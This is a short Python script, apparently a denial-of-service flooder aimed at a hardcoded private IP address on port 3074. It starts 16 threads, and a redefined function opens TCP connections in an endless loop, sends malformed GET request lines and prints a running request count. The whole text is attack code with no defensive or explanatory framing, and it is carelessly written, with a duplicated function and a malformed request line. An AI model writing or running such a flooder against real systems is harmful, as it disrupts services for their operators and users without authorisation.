from threading import Thread
import socket

target = "172.16.0.130"
port = 3074

def sendReq():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
    s.close()
    
for i in range(16):
    t = Thread(target=sendReq)
    t.start()
    req_num = 0
    def sendReq():
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
            global req_num
            req_num+=1
            print("Request : ", req_num )
            s.close()